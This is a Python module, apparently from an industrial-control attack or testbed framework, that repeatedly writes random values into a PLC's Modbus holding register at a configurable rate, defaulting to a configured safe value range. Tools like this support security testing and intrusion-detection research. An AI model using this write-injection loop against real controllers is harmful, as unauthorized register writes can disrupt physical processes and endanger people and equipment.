# injector/attacks/write_injection.py
import logging
import random
from dataclasses import dataclass
from typing import Optional
from threading import Event

from injector.core.config import PlcConfig, get_plc_config
from injector.runtime.task_runner import run_task_loop, LoopTiming

log = logging.getLogger(__name__)

@dataclass
class WriteInjState:
    target_register: int
    vmin: int
    vmax: int

def _tick_write_inj(*, client, cfg: PlcConfig, state: WriteInjState) -> None:
    value = random.randint(state.vmin, state.vmax)
    rq = client.write_register(state.target_register, value, unit=cfg.unit_id)
    if rq.isError():
        log.warning("WRITE injection error writing HR[%d]=%d: %s", state.target_register, value, rq)
    else:
        log.info("WRITE injection: wrote HR[%d] = %d", state.target_register, value)

def run_write_injection(
    cfg: Optional[PlcConfig] = None,
    stop_event: Optional[Event] = None,
    target_register: int = 2,
    qps: float = 5.0,
    value_min: Optional[int] = None,
    value_max: Optional[int] = None,
) -> None:
    cfg = cfg or get_plc_config()
    vmin = cfg.safe_write_min if value_min is None else value_min
    vmax = cfg.safe_write_max if value_max is None else value_max
    if vmin > vmax:
        vmin, vmax = vmax, vmin

    run_task_loop(
        name="WRITE_INJ",
        cfg=cfg,
        stop_event=stop_event,
        tick=_tick_write_inj,
        state=WriteInjState(target_register=target_register, vmin=vmin, vmax=vmax),
        timing=LoopTiming(qps=qps),
        connection_mode="persistent",
    )
